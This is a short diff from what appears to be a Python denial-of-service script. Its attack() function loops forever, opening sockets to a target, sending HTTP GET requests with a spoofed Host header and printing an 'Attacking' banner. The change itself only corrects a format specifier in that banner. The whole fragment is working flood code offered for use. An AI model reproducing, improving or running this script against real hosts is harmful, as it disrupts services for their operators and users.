@@ -8,7 +8,7 @@ def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        print(" \033[1;32;40m  Attacking \033[1;31;40m %s \033[1;32;40m on \033[1;31;40m %d \033[1;32;40m  through port \033[1;31;40m %d \033[1;32;40m  " % (url,target,port))
+        print(" \033[1;32;40m  Attacking \033[1;31;40m %s \033[1;32;40m on \033[1;31;40m %s \033[1;32;40m  through port \033[1;31;40m %d \033[1;32;40m  " % (url,target,port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
